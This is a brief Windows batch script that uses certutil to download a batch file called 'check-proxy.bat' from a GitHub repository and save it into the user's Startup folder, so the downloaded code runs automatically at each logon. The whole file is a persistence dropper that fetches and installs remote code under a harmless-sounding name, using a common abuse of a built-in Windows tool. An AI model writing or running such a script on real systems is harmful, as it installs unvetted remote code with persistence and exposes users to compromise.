@echo off
set "batFileUrl=https://github.com/nobita2906/file_vm/raw/main/check-proxy.bat"
set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "batFilePath=%startupFolder%\check-proxy.bat"
certutil -urlcache -split -f "%batFileUrl%" "%batFilePath%"
